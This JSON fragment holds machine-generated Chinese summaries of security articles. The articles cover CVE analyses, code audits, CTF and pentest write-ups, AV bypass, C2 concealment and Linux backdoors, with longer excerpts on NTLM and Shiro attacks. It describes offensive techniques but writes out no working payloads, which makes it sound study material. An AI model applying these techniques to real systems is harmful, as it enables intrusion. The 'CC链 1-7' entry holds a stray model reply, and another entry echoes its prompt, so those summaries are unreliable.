        "page_content": "该文档分析了一个小众 CMS 的代码，发现了多个漏洞，包括反射型 XSS、存储型 XSS、任意文件删除、任意文件上传和 SQL 注入。这些漏洞主要是由于错误处理、输入验证不足和安全措施缺失造成的。",
        "FileName": "9800-平平无奇的代码审计.pdf"
    },
    {
        "page_content": "该文档详细介绍了影响 Tomcat 服务器的三个安全漏洞，包括 CVE-2017-12615（任意文件写入）、CVE-2020-1938（AJP 文件包含）和 CVE-2019-0232（RCE），并提供了漏洞原理、复现步骤和缓解措施。",
        "FileName": "10083-tomcat漏洞大杂烩.pdf"
    },
    {
        "page_content": "该文档分析了 Minio 中从信息泄露到远程代码执行 (RCE) 漏洞的攻击链，该漏洞允许攻击者通过利用信息泄露漏洞获取凭据，然后使用这些凭据登录 Minio 并设置恶意升级 URL，从而触发 RCE。",
        "FileName": "12356-Minio从信息泄露到RCE漏洞分析(CVE-2023-28432).pdf"
    },
    {
        "page_content": "该文档详细介绍了渗透测试人员在 OSCP-Esay-DriftingBlues6 靶场中获取 webshell 并提权的过程。渗透测试人员通过信息收集、目录扫描、端点访问、暴力破解、漏洞利用和脏牛内核提权等技术，最终获得了目标机器的 root 权限。",
        "FileName": "12746-OSCP-Esay-DriftingBlues6.pdf"
    },
    {
        "page_content": "该文档记录了作者对基于 Thinkphp5 和 bootstrap 开发的后台框架 fastadmin 的渗透测试过程。作者通过常规手段（弱口令、SQL 注入）进入后台后，尝试利用 tp5 的 RCE 直接命令执行，但未成功。随后，作者发现可以上传文件，并成功上传一句话木马。由于命令执行函数被禁用，作者利用 fpm/fastcgi 绕过 disable_function，并最终利用 UAF 脚本绕过 disable_funtion，成功执行命令。此外，作者还发现该网站存在文件管理功能，可以任意上传文件，从而可以轻松获取 shell。",
        "FileName": "10164-挖洞小记.pdf"
    },
    {
        "page_content": "该文档主要分析了 Spring-beans 变量覆盖漏洞的原理，该漏洞利用 JDK 内省机制和 Spring 属性注入，通过修改 Tomcat 配置和日志位置，达到文件写入的效果。漏洞影响 Spring-beans 5.3.0~5.3.17、5.2.0~5.2.19 版本，JDK 9+，Apache Tomcat 传参时使用参数绑定，且为非基础数据类型。",
        "FileName": "11216-从JDK内省机制&Spring属性注入浅析Spring-beans变量覆盖问题.pdf"
    },
    {
        "page_content": "该文档分析了梦想 CMS 中的 SQL 注入漏洞，该漏洞允许攻击者通过在提交表单中插入 SQL 语句来执行错误注入。漏洞的利用链涉及多个函数和类，包括 AcquisiAction 类、AcquisiModel 类和 addDB() 函数。分析还发现了一个存储型 XSS 漏洞，允许攻击者在两个参数中注入恶意脚本。",
        "FileName": "10445-梦想CMS注入漏洞分析&发现小彩蛋.pdf"
    },
    {
        "page_content": "该文档讨论了常见的壳类型及其脱壳方法，包括压缩壳（如 UPX）和加密壳。它介绍了各种脱壳技术，例如使用脱壳机、手动 ESP 定律脱壳、API 定位脱壳、单步方法、模拟跟踪法、SFX 法和最后一次异常法。此外，它还提供了去除 UPX 壳特征的技巧，以绕过脱壳检测。",
        "FileName": "12686-常见的壳与脱壳方式.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何分析和破解一个加密定位应用程序的登录过程。通过定位和修改应用程序中的加密函数，作者能够解密登录数据包并生成自己的加密数据包，从而绕过应用程序的登录验证。该文档提供了详细的步骤和代码示例，展示了如何使用 Java 和 hook 脚本来实现这一过程。",
        "FileName": "12623-对某app的加密定位与hook.pdf"
    },
    {
        "page_content": "本文主要分析了两种DLL注入技术：常规DLL注入和反射DLL注入，并重点介绍了反射DLL注入的原理和实现过程。此外，本文还分析了CVE-2021-1675和CVE-2021-34527漏洞，并利用CVE-2021-1675漏洞实现了Cobalt Strike插件中的DLL反射加载，从而绕过AV查杀，完成提权需求。",
        "FileName": "10191-CS插件之DLL反射加载EXP绕过AV提升权限.pdf"
    },
    {
        "page_content": "CVE-2021-21972 漏洞存在于 VMware vCenter Server 的 vROPS 插件中，该插件中一个未经身份验证的文件上传接口允许攻击者上传文件到任意位置，从而在目标服务器上执行任意代码。该漏洞影响 vCenter Server 7.0 U1c 之前的 7.0 版本、6.7 U3l 之前的 6.7 版本以及 6.5 U3n 之前的 6.5 版本。",
        "FileName": "9244-vCenter 6.5-7.0 RCE 漏洞分析(CVE-2021-21972).pdf"
    },
    {
        "page_content": "该文档分析了 DVWA-Brute Force 漏洞，该漏洞存在于登录验证中，允许攻击者通过暴力破解或 SQL 注入来获取对系统的未经授权访问。文档详细介绍了漏洞的三个级别（低、中、高），并提供了利用这些级别的不同方法。",
        "FileName": "12014-DVWA-Brute Force.pdf"
    },
    {
        "page_content": "本文探讨了 HTTP 请求走私漏洞，重点介绍了 Content-Length 和 Transfer-Encoding 头在 HTTP 1.1 中的作用。它解释了如何利用这些头之间的不一致来绕过前端或后端服务器的验证，从而导致各种攻击，例如 XSS、SQL 注入和会话固定。",
        "FileName": "11423-谁能比我细---秒懂Http请求走私.pdf"
    },
    {
        "page_content": "该文档介绍了 OpenSCA 社区许可证风险早知道工具的 v1.0.12 版本更新，重点介绍了优化许可证检出功能，支持 JSON/HTML/SPDX 报告，以及 HTML 报告自定义分页功能。该更新旨在提高许可证检出效率，并通过自定义分页功能解决 HTML 报告加载缓慢的问题。",
        "FileName": "12697-版本升级  v1.0.12发布，许可证风险早知道.pdf"
    },
    {
        "page_content": "该文档主要介绍了 LDAP 注入、邮件头注入、操作系统命令注入、服务器端包含注入等 Web 应用程序漏洞的原理、利用方法和防护措施，并提供了相应的示例和代码分析。",
        "FileName": "12066-2.bWAPP OS Command Injection(Blind)&PHP Code Injection 系统命令执行.pdf"
    },
    {
        "page_content": "Confluence Server 和 Confluence Data Center 的 widgetconnector 组件存在严重的安全漏洞，可以在不需要账号登陆的情况下进行未授权访问，精心构造恶意的 JSON 字符串发送给 widgetconnector 组件处理，可以进行任意文件读取、Velocity-SSTI 远程执行任意命令。",
        "FileName": "8135-CVE-2019-3396 Confluence Velocity SSTI漏洞浅析.pdf"
    },
    {
        "page_content": "**主题：** Frida 入门和几种 Hook 思路\n\n**内容：** 本文介绍了 Frida 的安装和使用，并通过一个实战案例演示了如何使用 Frida 进行 Hook 操作。文中提供了三种 Hook 思路：打印真实解锁码、修改加密函数返回值和修改函数参数。此外，还介绍了使用 Python 作为加载器将 JS 代码注入到进程中的方法。",
        "FileName": "8211-frida 入门及几种 hook 思路.pdf"
    },
    {
        "page_content": "这篇文档记录了一次渗透测试，其中研究人员通过分析一个新上线系统的源代码，发现了测试系统的地址。通过对测试系统进行端口扫描，研究人员发现了Nacos服务，并使用默认密码成功登录。在Nacos配置中，研究人员找到了MySQL和Redis的密码，并使用爆破技术成功爆破出测试系统的前台和后台密码。最后，研究人员使用爆破出来的密码成功登录了生产系统的后台，完成了渗透测试任务。",
        "FileName": "11950-渗透实战：记一次弱口令的挖掘.pdf"
    },
    {
        "page_content": "本文档介绍了如何利用 ASP.NET Web API 帮助页面上传文件，包括寻找突破口、构造数据包、绕过限制和批量搜索目标网站。该方法利用了 ASP.NET Web API 帮助页面中上传接口的漏洞，允许攻击者上传文件，从而可能导致文件包含或远程代码执行等安全问题。",
        "FileName": "11697-利用ASP.NET Web API Help Page文件上传.pdf"
    },
    {
        "page_content": "文档介绍了 2021 极客峰会决赛渗透靶场 1 的解题过程，详细描述了如何利用各种漏洞和技术获取靶机上的 7 个 flag，包括目录扫描、SQL 注入、文件上传、Weblogic 漏洞利用、MySQL 漏洞利用和 UDF 提权。",
        "FileName": "10438-2021极客谷杯决赛渗透靶场1全解.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Spring heapdump 泄露 Shiro key 从而实现远程代码执行 (RCE) 的漏洞。它解释了漏洞的原理，即在 Spring Shiro 环境中存在 heapdump 文件泄露和 Shiro 相关漏洞时，可以从 JVM 内存中获取 Shiro key，从而利用该 key 进行 RCE。文档还提供了利用该漏洞的详细步骤，包括使用 JDumpSpider 或 jvisualvm.exe 获取 Shiro key，以及使用 Python 脚本将其转换为 base64 编码。",
        "FileName": "11908-heapdump泄露Shiro key从而RCE.pdf"
    },
    {
        "page_content": "该文档分析了 Seacms 框架中的代码审计，重点关注文件写入和文件包含漏洞。通过利用这些漏洞，攻击者可以写入 PHP 文件并执行代码，从而获得对系统的控制。文档还介绍了如何利用文件包含漏洞来修改可控文件，从而执行代码。最后，文档讨论了由于过度保护导致字符串内容变为可执行代码的漏洞。",
        "FileName": "9777-Seacms代码审计小结.pdf"
    },
    {
        "page_content": "本文分析了 Java Zip Slip 漏洞的成因和利用方式，并通过原生的 Java.util.zip、zt-zip 和 spring integration zip 三个库的案例进行详细分析。漏洞成因在于解压 zip 包时，zip 条目名可控，导致可以利用 \"../\" 跳转到任意目录，从而写入或覆盖任意文件。文中还提供了漏洞修复方案和实战挖掘案例，有助于理解和防御此类漏洞。",
        "FileName": "12081-Java Zip Slip漏洞案例分析及实战挖掘.pdf"
    },
    {
        "page_content": "该文档分析了 \"⽩痴\" 上帝视⻆调节反序列化链之 CC2 漏洞，通过分析 PriorityQueue.readObject() 方法中的 heapify() 函数，发现了一条命令执行链。利用 javassist 动态编程技术，可以生成一个类，通过 newTransformer()->getTransletInstance()->defineTransletClasses()->loader.defineClass(_bytecodes[i]) ->_class[_transletIndex].newInstance() 链加载并实例化该类，从而执行任意命令。",
        "FileName": "10275-白痴上帝视角调节反序列化链之CC2.pdf"
    },
    {
        "page_content": "该文档分析了 Spring Messaging 中的远程代码执行漏洞，该漏洞允许攻击者通过发送带有恶意 payload 的订阅消息来执行任意代码。漏洞的触发涉及解析恶意表达式并将其存储在消息指定的目的地地址下，然后在发送发送消息时从目的地地址获取表达式并触发漏洞。补丁通过将 StandardEvaluationContext 修改为 SimpleEvaluationContext 来修复漏洞，后者不支持 Java 类型引用、构造函数和 bean 引用。",
        "FileName": "10464-spring-messaging 远程代码执行漏洞分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了对某 CMS 代码进行审计，发现了一个经过过滤的远程命令执行 (RCE) 漏洞。审计人员通过绕过过滤，成功执行命令并获取 shell 权限。绕过方法涉及使用符号连接命令和 URL 编码，最终通过下载一句话木马文件并执行 PHP 代码来获取 shell。",
        "FileName": "9990-某cms代码审计RCE&艰难bypass(思路清奇).pdf"
    },
    {
        "page_content": "该文档分析了 Java 常用框架中 SQL 注入的主题，重点介绍了 JDBC 和 Mybatis 框架中存在的 SQL 注入漏洞，并提供了使用预编译语句和参数化查询等安全实践来防止这些漏洞的建议。",
        "FileName": "11672-JAVA常用框架SQL注入审计.pdf"
    },
    {
        "page_content": "**文档主题：** NTLM 认证相关攻击技巧（较全）\n\n**文档内容：**\n\nNTLM 认证相关的攻击技巧（较全）\n\n本篇主要介绍 NTLM 认证相关的攻击技巧。\n\n首先得说明一下 NTLM 协议是 windows 两大认证协议之一，在了解其攻击方法之前学习它的认证协议流程是十分有必要的！因此在正文开头会大略带大家把认证基础⾛一遍。再了解完认证协议之后，需要去了解一下 LLMNR 、 NetBIOS 协议。因为这两种协议是攻击的前提，有了它两才有了这种攻击技巧！\n\n此外 SMB 协议 与 NET-NTLM v1\\v2   也是我们需要去了解的，只有把这些弄懂后，你才能对相关原理大体会弄懂！当然了，如果你 是 脚本小仔 不想去懂原理，那么在一些不顺利的场景下，你就完全就失去竞争的能力！\n\n在说完需要学习的前置知识之后，我来大体会描述一下 NTLM 认证攻击和适用的场景！大至的攻击流程 ( 缺少认证细节 ) ：\n\n（ 1 ） SMB 欺骗篇 ：有一个人小仙女，她喜欢你们学校的 0xxk 。但是她记错了名字，记成了 xxkk 。她先翻了学校公示栏的学生活动表，发现找不到 xxkk ，然后就去学校领导办公室翻学生活动表也找不到。这个时候她急了，就去学校广播站拿个大喇叭喊，问谁是 xxkk 。这个时候整个校园的人都听到了，然后你起了⽍心。跑去和妹纸说你是 xxkk ，这时候你伪造了一个定情信物 112233 给妹纸。妹纸再拿出她的定情信物 qweqweqwe ，和你的定情信物加密一下后返还给我。这个时候我就拿到了我自己的和妹纸双方的信息加密后的凭证。此凭证只能用来破解出妹纸的定情信物，这时候拿工具跑运⽓好就跑出明文密码了。\n\n（ 2 ） 中继攻击篇 ：这个时候你知道了对",
        "FileName": "8562-NTLM认证相关攻击技巧（较全）.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2012-0158 漏洞，该漏洞存在于 Microsoft Office 2007 中，可通过栈溢出进行利用。文档详细介绍了漏洞的验证、分析和利用过程，并提供了利用该漏洞的 POC 和 MSF 生成的 EXP。",
        "FileName": "7464-漏洞分析学习之cve-2012-0158.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何分析和解决 2021 陇剑杯中名为“机密内存”的压轴题，该题涉及使用 VMware 加密功能加密的内存镜像。文档提供了详细的解题思路和步骤，包括分离和修复加密文件、获取虚拟机密码、解密虚拟机、导出注册表和进程信息，以及分析恶意软件和痕迹清除工具。",
        "FileName": "10284-2021陇剑杯-机密内存-解题过程分析.pdf"
    },
    {
        "page_content": "该文档涵盖了网络安全基础知识，包括加密协议、攻击类型、系统安全技术、网络物理隔离、虚拟协议网络、网络地址转换、IP 地址块、IPv6 地址、查看网页源代码的方法、ROT-13 加密、base64 加密、MD5 加密、种族歧视、冒充登录用户、比较数字大小、本地访问限制和 robots.txt 文件。",
        "FileName": "12132-网络安全实验室1.选择题和2.基础关.pdf"
    },
    {
        "page_content": "Apache Shiro 是一个强大的和易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理。根据官方网站上的漏洞通报，Shiro 历史漏洞分析共报了 11 个 CVE（以及最新披露的 CVE），其中包含认证绕过、反序列化等漏洞类型，接下来我们来依次学习。\n\n漏洞编号： CVE-2010-3863 / CNVD-2010-2715\n影响版本： shiro < 1.1.0 和 JSecurity 0.9.x\n漏洞描述：Shiro 在进行权限验证前未进行路径标准化，导致使⽤时可能绕过权限校验\n漏洞补丁： Commit\n参考：\nShiro 550 反序列化漏洞分析\n关键代码处于 AbstractRememberMeManager#getRememberedPrincipals 方法中，参数是用户身份 Context 信息，如下图\n这个方法主要是把 SubjectContext 转换为 PrincipalCollection。该方法调⽤了 getRememberedSerializedIdentity 和 convertBytesToPrincipals 方法。\n其中 CookieRememberMeManager 的 getRememberedSerializedIdentity 的实现是获取 Cookie 并 Base64 解码\nCVE-2016-4437 漏洞信息\n漏洞分析将解码后的 byte 数组传⼊ convertBytesToPrincipals 中进⾏：\ndecrypt 和 deserialize。\ndecrypt 是使⽤ AesCipherService 进⾏解密。\ndeserialize 是调⽤ deserialize() 方法反序列化解密后的数据。\n反序列化得到的 PrincipalCollection 会被 set 到 SubjectContext。\n解密调⽤栈⼊下图所示\n此时就可以想象，如果我们有了加密密钥，使⽤密钥加密⼀个恶意序列化的 payload，将 rememberMe 的值替换成 base64 后 的 payload 传⼊服务器，那这样就可以触发漏洞了。关键点在于，我们如何获取加密密钥？\n这就要提到 CVE-2014-0074，就有⼈提出了硬编码可能带来的问题。\n但 p 师傅在 Java 漫谈中否定了这⼀观点，并写出结论：如果反序列化流中包含⾮ Java ⾃身的数组，则会出现⽆法加载类的错误。这就解释了为什么 CommonsCollections6 反序列化链无法利⽤了，因为其中⽤到了 Transformer 数组。\np 师傅在漫谈中分析讲解了两种 poc，⼀个是使⽤ TemplatesImpl 改造的⽆数组 CCShiro 反序列化链，这个链需要有 CC 依赖，另⼀个是 CB 的⽆依赖 Shiro 反序列化链\n这两个 poc 都可以测试成功了。\nShiro 在 1.2.5 版本的 Commit 中对此漏洞进⾏了修复。系统在启动的时候会⽣成⼀个新 key，⽤户也可以⼿动配置⼀个 ciphe rKey。\n其实如果⽤户设置的密钥泄漏或者太简单的话，还是会被攻击成功。\n其实在 CVE-2010-3863 中，依旧是路径标准化导致的问题，不过之前是在 RequestURI 上，本漏洞是在 ContextPath 上。\n之前提到，Shiro 调⽤ WebUtils.getPathWithinApplication() 方法获取请求路径。逻辑如下：\npublic String getPathWithinApplication(HttpServletRequest request) {\nString contextPath = this.getContextPath(request);\nString requestUri = this.getRequestUri(request);\nString path = this.getRemainingPath(requestUri, contextPath, true);\nif (path != null) {\nreturn StringUtils.hasText(path) ? path : \"/\";\n} else {\nreturn requestUri;\n}\n}\n其中调⽤ getContextPath() 方法，获取 contextPath。\n由于获取的 ContextPath 没有标准化处理，如果出现⼀些特殊字符使 ContextPath 与实际不符，都会导致在 StringUtils.s tartsWithIgnoreCase() 方法判断时失效，直接返回完整的 RequestURI。\n登录账户 lonestarr，该账户对⻚⾯ remoting.jsp 没有访问权限，在跟路径前加任意路径，再加 ../ 即可实现绕过\n漏洞详解\n复现 Shiro 在 1.3.2 版本的 Commit 中对此漏洞进⾏了修复。\n通过代码可以看出，在 getChain 方法进⾏了更新，使⽤了修复 CVE-2010-3863 时更新的路径标准化⽅法 normalize 进⾏处理 ContextPath，之后再返回。\n漏洞编号： CVE-2019-12422 / CNVD-2016-07814 / SHIRO-721\n影响版本： shiro < 1.4.2\n漏洞描述：RememberMe 默认通过 AES-128-CBC 模式加密，易受 Padding Oracle Attack 攻击\n漏洞补丁： Commit\n参考：\npadding oracles\nPaddingOracleAttack-Shiro-721\n代码分析\n漏洞修复\nCVE-2019-12422 漏洞信息本次漏洞实际并不是针对 shiro 代码逻辑的漏洞，⽽是针对 shiro 使⽤的 AES-128-CBC 加密模式的攻击，⾸先了解⼀下这 种加密⽅式。\nAES-128-CBC 模式就代表使⽤ AES 钥⻓度为 128bit，使⽤ CBC 分组算法的加密模式。\nAES 是对称、分组加密算法，分组⻓度固定为 128bit，密钥⻓度可以为 128bit（16 字节）、192bit（24 字节）、256bit（32 字节），如果数据块及密钥⻓度不⾜时，会补⻬。\nCBC，全称 Cipher Block Chaining （初始化向量（Initialization Vector，IV）⾸先和第⼀组明⽂进⾏ XOR 操作，得到 ” 中间值 “\n采⽤密钥对中间值进⾏块加密，删除第⼀组加密的密⽂（加密过程涉及复杂的变换、移位等）\n第⼀组加密的密⽂作为第⼆组的初始向量（IV），参与第⼆组明⽂的异或操作\n依次执⾏块加密，最后将每⼀块的密⽂拼接成密⽂\nIV 经常会被放在密⽂的前⾯，解密时先获取前⾯的 IV，再对后⾯的密⽂进⾏解密\n解密过程\n会将密⽂进⾏分组（按照加密采⽤的分组⼤⼩），前⾯的第⼀组是初始化向量，从第⼆组开始才是真正的密⽂\n使⽤加密密钥对密⽂的第⼀组进⾏解密，得到中间值\n将中间值和初始化向量进⾏异或，得到该组的明⽂\n前⼀块密⽂是后⼀块密⽂的 IV，通过异或中间值，得到明⽂⽚段\n全部解密完成后，拼接得到明⽂，密码算法校验明⽂的格式（填充格式是否正确）\n校验通过得到明⽂，校验失败得到密⽂\n这个攻击的根源是明⽂分组和填充，同时应⽤程序对于填充异常的响应可以作为反馈。⾸先明确以下两点\n1. 解密之后的最后⼀个数据块，其结尾应该包含正确的填充序列。如果这点没有满⾜，那么加 / 解密程序就会抛出⼀个填充 异常。Padding Oracle Attack 的关键就是利⽤程序是否抛出异常来判断 padding 是否正确。\n2. 解密时将密⽂分组，第⼀组是初始化向量，后⾯才是真正的密⽂。密⽂传过去后先解密得到中间值，中间值与初始向量异或得 到明⽂⽚段。\n⽐如我们的明⽂为 admin，则需要被填充为 admin\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b，⼀共 11 个 \\x0b\n如果我们输⼊⼀个错误的 IV，依旧是可以解密的，但是中间值 middle 和我们输⼊的 IV 经过异或后得到的填充值可能出现错 误这样就出现验证错误的情况。\n⽐如本来应该是 admin\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b，⽽我们错误的得到\nadmin\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x2b\n这样解密程序往往会抛出异常 ( Padding Error )，应⽤在 web 里的时候，往往是 302 或是 500 报错，⽽正常解密的时候是 200\n所以这时，我们可以根据服务器的反应来判断我们输⼊的 IV 是否正确\nPadding Oracle Attack 原理这⾥使⽤ 参考链接 中的数据进⾏举例说明\n我们假设正确的 IV 为 0x6d 0x36 0x70 0x76 0x03 0x6e 0x22 0x39\nmiddle 中间值为 ( 为了⽅便，这⾥按 8 位分组来阐述 )\n0x39 0x73 0x23 0x22 0x07 0x6a 0x26 0x3d\n解密后正确的明⽂为：\nTEST0x",
        "FileName": "11633-Shiro 历史漏洞分析.pdf"
    },
    {
        "page_content": "**文档主题：** win pwn 初探（三）\n\n**文档内容：**\n\n本节主要介绍绕过 ASLR 和 GS 保护机制，通过泄露 StackCookie、程序基地址、返回地址，最终利用 ret2libc3 攻击成功。文中详细介绍了漏洞利用过程，包括泄露 StackCookie、泄露程序基地址、打返回地址到 main 函数、泄露 dll_base、寻找可用的 gadgets、构造 rop 等步骤。",
        "FileName": "11913-win pwn初探（三）.pdf"
    },
    {
        "page_content": "**主题：** ThinkPHP 5.1.17 框架中的 SQL 注入漏洞\n\n**内容：** 该漏洞是由程序在处理 order by 后的参数时，未正确过滤处理数组的 key 值所造成。虽然该漏洞是 SQL 注入，但由于使用了参数化查询 PDO，将参数与查询语句分离，因此只能爆出基本信息，无法进行子查询或获取更关键的信息。分析表明，该漏洞实际上是控制了参数绑定的过程，导致在预编译阶段就触发了报错，从而实现了注入。然而，由于 PDO 的预处理机制，该漏洞的危害被降到了最低。",
        "FileName": "10839-Thinkphp5 SQL注入漏洞引发的思考.pdf"
    },
    {
        "page_content": "该文档分析了 Linux 内核中 cross-cache overflow 和 page-level heap fengshui 两种利用手法，并通过一个内核 pwn 漏洞演示了如何利用 cross-cache overflow 攻击近乎任意的内核结构体，再利用 page-level heap fengshui 完成对目标内核结构体的覆盖，最终实现提权。",
        "FileName": "12417-从 corCTF 一道 kernel pwn 看 Linux 内核 cross-cache overflow 与页级堆风水.pdf"
    },
    {
        "page_content": "该文档详细介绍了在域渗透中使用黄金票据维持权限的技术，包括环境搭建、漏洞利用、提权、信息获取和权限维持的步骤。通过伪造黄金票据，攻击者可以在域控制器权限丢失后，通过域内其他边缘主机重新获取最高权限，从而实现权限的长期维持。",
        "FileName": "9855-域渗透之黄金票据维持权限.pdf"
    },
    {
        "page_content": "该文档分析了 SmarterStats 中基于 gRPC 的远程代码执行 (RCE) 漏洞，该漏洞允许攻击者读取和写入任意文件。文档详细介绍了漏洞的利用过程，包括使用 gRPC 客户端调用远程函数以及构造请求和响应。此外，文档还讨论了如何修复漏洞，包括限制文件写入的白名单和正则表达式路径限制。",
        "FileName": "11475-SmarterStats 基于gRPC的RCE.pdf"
    },
    {
        "page_content": "好的，我注意到了。我将只输出文档的内容，而不包含文档的主题。",
        "FileName": "9409-CC链 1-7 分析.pdf"
    },
    {
        "page_content": "该文档分析了 Linux 内核提权漏洞 CVE-2022-0847（DirtyPipe），该漏洞利用了 pipe() 函数和 splice() 函数中的类型混淆，允许攻击者通过将管道缓冲区的标志设置为 PIPE_BUF_FLAG_CAN_MERGE 来实现任意文件写入，从而获得 root 权限。",
        "FileName": "11027-Linux提权CVE-2022-0847分析-DirtyPipe.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-26085 漏洞，该漏洞存在于 Confluence 中，允许攻击者读取任意文件。漏洞利用了 UrlRewriteFilter 组件中对请求处理的逻辑缺陷，导致 DefaultServlet 可以处理不应该处理的请求，从而读取 web.xml 文件。修复版本为 7.4.10、7.12.3、7.13.0 和 7.14.0。",
        "FileName": "10444-Confluence文件读取漏洞分析.pdf"
    },
    {
        "page_content": "**主题：** Apache Flink 中的任意文件读取和写入漏洞\n\n**内容：** 该文档详细介绍了 Apache Flink 中的两个高危漏洞（CVE-2020-17518 和 CVE-2020-17519），分别允许任意文件写入和任意文件读取。文档提供了漏洞分析、服务搭建和路由信息获取的步骤，并展示了如何利用这些漏洞在目标系统上执行任意文件操作。",
        "FileName": "9023-Flink 任意文件读取和写入.pdf"
    },
    {
        "page_content": "该文档分析了以下文档并完成以下任务：\n                    1. 分析文档的主题和内容\n                    2. 用一段话概括文档\n\n**文档主题：** URLDNS 和 CommonsCollections1-7 分析 + 复现\n\n**文档内容：**\n\n该文档详细分析了 URLDNS 和 CommonsCollections1-7 中的多个利用链，并提供了复现步骤。它解释了每个利用链的工作原理，包括涉及的类、方法和参数。文档还讨论了 Java 版本对利用链的影响，以及 Java 对这些漏洞的修复。\n\n**一段话概括：**\n\n该文档提供了对 URLDNS 和 CommonsCollections1-7 中多个利用链的深入分析，包括复现步骤、工作原理和 Java 版本的影响。它有助于理解这些漏洞的利用方式，以及 Java 如何修复它们。",
        "FileName": "7157-ysoserial URLDNS, CommonsCollections1-7 分析+复现.pdf"
    },
    {
        "page_content": "文档介绍了 Linux 中 mprotect 函数的功能，该函数用于设置内存块的权限。它提供了函数原型、权限值和源代码，并解释了如何使用该函数修改虚拟地址范围的内存属性。",
        "FileName": "12717-pwn中mprotect函数利用详解.pdf"
    },
    {
        "page_content": "该文档主要介绍了 .NET 中 DataContractSerializer 的使用，包括其序列化和反序列化功能，以及在反序列化过程中如何利用 SessionViewStateHistoryItem 攻击链进行攻击。",
        "FileName": "9599-.net反序列化之DataContractSerializer.pdf"
    },
    {
        "page_content": "该文档介绍了对 JAVA 应用程序的审计，重点关注 SQL 注入、任意文件读取和写入、越权修改密码以及模板注入等漏洞。通过分析代码和数据包，作者展示了如何利用这些漏洞来获取未经授权的访问、读取和修改敏感信息。",
        "FileName": "11925-JAVA审计初探.pdf"
    },
    {
        "page_content": "该文档介绍了如何在腾讯云函数中隐藏 Cobalt Strike C2 服务器，通过使用云函数作为中间人，将流量从 C2 服务器重定向到云函数，再由云函数将流量转发到 C2 服务器，从而隐藏 C2 服务器的真实地址。",
        "FileName": "10764-云函数隐藏C2爬坑记.pdf"
    },
    {
        "page_content": "本文档介绍了 Linux 系统中常见的后门技术，包括修改 passwd 文件、SSH 免密码登录、计划任务、开机启动项、Vim 后门、终端解析、预加载型动态链接库后门、进程注入和内核级 rootkit。这些技术可以帮助攻击者在入侵后维持对系统的访问权限，而排查方法包括检查文件、网络、进程和系统完整性。",
        "FileName": "10079-linux常见backdoor及排查技术.pdf"
    },
    {
        "page_content": "该文档记录了对 vulntarget-a 靶场的渗透测试过程，包括利用未授权访问 Redis 获取 webshell、利用 CVE-2020-1472 置空域控密码、利用 psexec 获取域管权限等步骤，最终成功获得域控权限。",
        "FileName": "12504-vulntarget-a靶场笔记.pdf"
    },
    {
        "page_content": "本文分析了 70 多个缓存投毒漏洞，这些漏洞利用了 Web 缓存中常见的模式，例如未加密的报头、URL 片段处理不当和自定义缓存配置，从而导致缓存中毒、DoS 攻击和 XSS 攻击。",
        "FileName": "10848-大规模缓存投毒总结.pdf"
    },
    {
        "page_content": "本文主要介绍了利用 Redis on Windows 的 DLL 劫持漏洞来实现远程代码执行。作者通过分析 RDP 连接过程中的 DLL 查找机制，发现 mstlsapi.dll 存在 DLL 未找到的问题。利用 DLLHijacker 工具生成劫持 DLL，并通过主从复制将劫持 DLL 写入 Redis 安装目录。通过执行 BGSAVE 或 BGREWRITEAOF 命令，触发 DLL 劫持，加载 calc.exe。该漏洞利用依赖于主从复制无损文件写入，适用于内网环境，公网环境需要目标具有出网能力。",
        "FileName": "8153-Redis on Windows 出网利用探索.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-36180 漏洞的调试过程，重点关注了在 Windows 和 Mac 系统上运行漏洞时的差异。通过比较 Windows 和 Mac 系统上的调试调用链，作者发现漏洞触发与否的关键在于 props 数组中 pooledConnection 参数和 parentLogger 参数的相对位置。在 Mac 系统中，parentLogger 参数在前，导致配置时报错，而 pooledConnection 参数在前时，漏洞触发。因此，pooledConnection 参数是漏洞触发点。",
        "FileName": "9227-CVE-2020-36180的调试分析.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Apache Kylin 中的两个漏洞：CVE-2021-45456 和 CVE-2022-44621。CVE-2021-45456 允许攻击者通过直接执行用户请求中的项目来执行命令，而 CVE-2022-44621 则允许攻击者通过未过滤的 jobId 参数执行命令。文档提供了漏洞报告、影响版本、环境配置、调试和攻击步骤，以及补丁和参考链接。",
        "FileName": "12186-kylin CVE-2021-45456 & CVE-2022-44621.pdf"
    },
    {
        "page_content": "该文档详细介绍了 ByteCTF web sp-oauth 题目的解题过程，该题目考察了对 Spring-oauth 的理解。解题思路是通过设置 redirect_url 为恶意 URL，获取服务器收到的 code，然后利用该 code 获得管理员 cookie，进而访问 30003 端口的用户，并通过 SQL 注入和反序列化漏洞最终获取到恶意 payload。",
        "FileName": "10389-ByteCTF web sp-oauth 题解.pdf"
    },
    {
        "page_content": "该文档介绍了如何绕过安全狗的 SQL 注入检测，包括绕过 order by、union select 和系统函数的检测方法。通过添加注释符、使用 / / 形成完整 SQL 语句、绕过系统函数和使用联合查询，可以绕过安全狗的检测，从而执行 SQL 注入攻击。",
        "FileName": "7515-一次实战sql注入绕狗.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 TWCMs 中的上传绕过漏洞来执行任意代码。该漏洞允许攻击者通过修改 .htaccess 文件来绕过上传限制，并上传包含 PHP 代码的图像文件。攻击者随后可以利用该代码在服务器上执行任意命令。",
        "FileName": "10871-一次艰难的审计.pdf"
    },
    {
        "page_content": "本文探讨了 JSON 格式下的 CSRF 攻击，分析了其原理、常见利用方式和防御机制。作者通过真实场景案例，展示了如何利用 JSON 格式的 CSRF 漏洞，并提出了三种利用思路：JSON 格式闭合、通过 XHR 提交和借助 Flash 利用 307 跳转实现 CSRF。最后，文章总结了 CSRF 攻击的防御措施，包括检查 Referer、限制 Cookie 生命周期、使用验证码和使用一次性 token。",
        "FileName": "7911-一次渗透测试引发的Json格式下CSRF攻击的探索.pdf"
    },
    {
